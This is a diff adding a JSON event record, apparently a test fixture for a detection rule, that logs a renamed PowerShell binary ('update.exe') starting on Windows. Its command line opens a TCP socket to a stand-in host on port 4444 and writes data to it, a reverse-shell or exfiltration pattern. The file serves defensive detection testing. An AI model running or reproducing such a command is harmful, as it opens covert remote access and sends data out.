@@ -1,0 +1,23 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "update.exe",
+    "pe": {
+      "original_file_name": "PowerShell.EXE"
+    },
+    "command_line": "update.exe -Command \"$c=New-Object System.Net.Sockets.TCPClient('192.0.2.10',4444);$s=$c.GetStream();$s.Write($b,0,$b.Length)\""
+  }
+}
